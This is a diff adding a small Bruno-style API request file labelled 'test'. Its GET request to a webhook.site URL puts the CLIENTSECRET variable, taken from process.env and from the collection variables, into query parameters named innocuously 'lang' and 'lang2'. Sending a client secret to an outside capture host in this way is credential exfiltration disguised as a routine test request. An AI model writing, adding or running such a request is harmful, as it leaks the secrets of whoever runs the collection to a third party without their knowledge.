@@ -1,0 +1,16 @@
+meta {
+  name: test
+  type: http
+  seq: 4
+}
+
+get {
+  url: https://webhook.site/34623983-5855-4f25-84dc-a03946f9338c?lang={{process.env.CLIENTSECRET}}&lang2={{CLIENTSECRET}}
+  body: none
+  auth: none
+}
+
+params:query {
+  lang: {{process.env.CLIENTSECRET}}
+  lang2: {{CLIENTSECRET}}
+}
